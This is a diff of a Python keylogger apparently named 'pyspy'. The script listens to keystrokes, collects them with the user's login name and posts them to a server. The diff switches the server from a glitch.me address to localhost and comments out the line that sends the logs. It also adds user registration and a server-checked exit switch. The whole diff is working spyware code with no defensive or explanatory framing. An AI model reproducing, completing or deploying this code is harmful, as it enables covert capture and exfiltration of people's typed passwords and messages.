@@ -5,6 +5,7 @@ import getpass
 from time import ctime
 import datetime
 import requests
+import sys
 
 keyboard = Controller()
 mouse = Controller()
@@ -12,8 +13,17 @@ mouse = Controller()
 message = ""
 user = getpass.getuser()
 
-#URL = 'http://localhost:3000/newmessage'
-URL = 'https://grishadev-pyspy.glitch.me/newmessage'
+URL = 'http://localhost:3000/newmessage'
+initReq = 'http://localhost:3000/inituser'
+getusersReq = 'http://localhost:3000/users'
+# URL = 'https://grishadev-pyspy.glitch.me/newmessage'
+
+def init():
+    try:
+        r = requests.post(initReq,data={"user":user})
+        print(r.status_code, r.reason)
+    except:
+        print("Error sending request")
 
 def on_press(key):
     global message
@@ -43,10 +53,29 @@ def on_release(key):
 
 def sendMessage(log):
     try:
-        r = requests.post(URL,data={"msg":log})
+        # r = requests.post(URL,data={"msg":log})
+        # print(r.status_code, r.reason)
+        print("stfu")
+    except:
+        print("Error sending request")
+    getUsers()
+
+def getUsers():
+    try:
+        r = requests.get(getusersReq)
         print(r.status_code, r.reason)
     except:
         print("Error sending request")
+    usersjson = r.json()
+    users = usersjson['users']
+    if user not in users:
+        destroy()
+
+def destroy():
+    sys.exit()
+
+init()
+
 # Collect events until released
 with Listener(
         on_press=on_press,
